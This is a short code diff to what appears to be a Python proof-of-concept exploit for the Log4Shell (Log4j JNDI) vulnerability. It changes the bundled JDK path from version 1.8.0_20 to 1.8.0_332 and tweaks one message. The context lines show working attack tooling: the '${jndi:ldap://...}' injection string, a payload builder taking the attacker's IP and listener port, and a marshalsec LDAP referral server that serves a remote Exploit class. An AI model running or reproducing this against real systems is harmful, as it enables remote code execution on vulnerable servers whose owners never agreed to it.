@@ -59,7 +59,7 @@ public class Exploit {
 
     try:
         p.write_text(program)
-        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/javac"), str(p)])
+        subprocess.run([os.path.join(CUR_FOLDER, "jdk1.8.0_332/bin/javac"), str(p)])
     except OSError as e:
         print(Fore.RED + f'[-] Something went wrong {e}')
         raise e
@@ -84,7 +84,7 @@ def payload(userip: str, webport: int, lport: int) -> None:
 
 def check_java() -> bool:
     exit_code = subprocess.call([
-        os.path.join(CUR_FOLDER, 'jdk1.8.0_20/bin/java'),
+        os.path.join(CUR_FOLDER, 'jdk1.8.0_332/bin/java'),
         '-version',
     ], stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
     return exit_code == 0
@@ -92,11 +92,11 @@ def check_java() -> bool:
 
 def ldap_server(userip: str, lport: int) -> None:
     sendme = "${jndi:ldap://%s:1389/a}" % (userip)
-    print(Fore.GREEN + f"[+] Send me: {sendme}\n")
+    print(Fore.GREEN + f"\n[+] Send me: {sendme}\n")
 
     url = "http://{}:{}/#Exploit".format(userip, lport)
     subprocess.run([
-        os.path.join(CUR_FOLDER, "jdk1.8.0_20/bin/java"),
+        os.path.join(CUR_FOLDER, "jdk1.8.0_332/bin/java"),
         "-cp",
         os.path.join(CUR_FOLDER, "target/marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
